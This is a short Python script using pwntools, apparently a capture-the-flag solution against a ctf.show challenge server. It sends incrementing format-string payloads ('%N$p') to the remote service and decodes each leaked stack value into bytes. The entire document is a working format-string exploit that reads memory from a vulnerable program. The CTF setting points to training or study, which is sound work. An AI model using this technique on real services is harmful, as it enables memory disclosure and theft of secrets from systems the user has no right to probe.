from pwn import *
context.log_level = 'error'
def leak(payload):
    io = remote('pwn.challenge.ctf.show',28213)
    io.recv()
    io.sendline(payload)
    data = io.recvuntil('\n', drop=True)
    if data.startswith(b'0x'):
        print(p64(int(data, 16)))
    io.close()
i = 1
while 1:
    payload = '%{}$p'.format(i)
    leak(payload)   
    i += 1